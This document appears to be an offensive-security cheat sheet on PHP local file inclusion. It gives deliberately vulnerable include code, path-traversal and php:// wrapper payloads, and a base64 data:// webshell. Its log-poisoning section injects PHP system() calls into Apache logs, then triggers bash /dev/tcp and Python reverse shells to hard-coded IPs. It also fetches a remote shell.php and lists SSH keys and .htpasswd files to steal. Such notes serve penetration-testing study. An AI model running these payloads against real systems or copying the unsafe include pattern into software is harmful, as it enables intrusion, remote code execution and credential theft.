## Local file inclusion

### PHP
##### Vulnerable code:
###### Standard vulnerable to everything:
```php
<?php                                                                                                                                                                                                                                          
include 'templates/header.php';                                                                                                                                                                                                                
?>                                                                                                                                                                                                                                             
<div class="container mt-4">                                                                                                                                                                                                                   
<?php                                                                                                                                                                                                                                          
ini_set('display_errors', true);       # UNSAFE        
ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards). If enabled, won't allow reads to anyhting not user-owned, DB creds should be in the file if it accesses any DB. Other functions can be disabled (readfile, basedir)
# http://php.adamharvey.name/manual/en/ini.sect.safe-mode.php

ini_set('allow_url_fopen', false);     # Disallows PHP opening URL files                
ini_set('allow_url_include', false);   # Allows "include" statements to the PHP code. note: Can only be enabled if "allow_url_fopen" is true. https://www.php.net/manual/en/filesystem.configuration.php
ini_set('allow_url_include', 'Off');   # ?

if(isset($_GET['page'])){
        include($_GET['page']); # VULNERABLE (any payload injected will work)
}else{
        include 'menu.php';
}
?>
</div>
<?php
include 'templates/footer.php';
?>
```
###### PHP with filter (/var/www/html):
```php
<?php
include 'templates/header.php';
?>
<div class="container mt-4">
<?php
ini_set('display_errors', true);       # UNSAFE        
ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards). If enabled, won't allow reads to anyhting not user-owned, DB creds should be in the file if it accesses any DB. Other functions can be disabled (readfile, basedir)
# http://php.adamharvey.name/manual/en/ini.sect.safe-mode.php

ini_set('allow_url_fopen', false);     # Disallows PHP opening URL files                
ini_set('allow_url_include', false);   # Allows "include" statements to the PHP code. note: Can only be enabled if "allow_url_fopen" is true. https://www.php.net/manual/en/filesystem.configuration.php
ini_set('allow_url_include', 'Off');   # ?

function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}else{
    include 'menu.php';
}
?>
</div>
<?php
include 'templates/footer.php';
?>

```

#### Achieving LFI:
##### General payloads
```
- Standard:
/etc/passwd
../../../../../../../etc/passwd

- URL encodings
%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

- "Filter and remove" bypass
....//....//....//....//....//....//....//....//etc/passwd

- Original path kept
/var/www/../../etc/passwd
/var/www/html/../../../etc/passwd
```

##### PHP wrappers
PHP wrappers have the same general functionality as normal LFI, but they can bypass some filters.
```
php://filter/string.rot13/resource=../../../../../etc/passwd
php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd                              // Use to read PHP files (resource=index.php)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt         // `cmd` argument inclusion, prints "Shell done!" if it works
```


### Log poisoning (RCE)
##### Required
Access to files
A log file (Usually `/var/log/apache2/access.log`), see #

#### Linux
##### Important
First, run 
```
../../../proc/self/environ
```
to get general information.
If RCE doesn't work, try RFI (other vhosts on machine)
If there is HTTP-BASIC-AUTH involved, check the `.htpasswd` file, it often contains credentials. (usually `/etc/apache2/.htpasswd`)
##### Target files: 
```
RCE:
/var/log/apache2/access.log
Payload:
	bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261%22 

Other potentially interesting files:
/proc/self/environ
/etc/passwd -->
	/home/USER_FOUND/.ssh/id_rsa
	/home/USER_FOUND/.bash_history
	/home/USER_FOUND/.bash_profile

```

#### Windows
##### Target files: 
```
C:\xampp\apache\logs\access.log
Payload:
	https://www.revshells.com/ (Powershell base64 - URL encoded)
```

#### General
Payload: 
```
<?php system($_GET['test']);?>

// Get PHP shell (named shell.php) from python3 server (saves as shell.php)
<?php file_put_contents('shell.php', file_get_contents('http://IP:PORT/shell.php'))?>
```

First, you need to get the payload in the log system:

```
nc IP PORT
GET /'<?php system($_GET['rce']); ?>'
test=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F4444%200%3E%261%22 
```

If this does not work, set your User-Agent as the payload.

To use the payload, send a request to the log file with the command in your payload:
```
// Template
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=PAYLOAD

// Examples
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=sh -i >& /dev/tcp/10.8.1.167/4444 0>&1
curl http://IP/vulnerable.php?file=LOG_FILE_LOCATION&CMD=export RHOST="10.8.1.167";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

### Note
Importanot note:
If you can read `/etc/passwd`, go through every user's home directory for the `.bashrc`


##### Mongo
Target file: `/var/www/dev/index.js`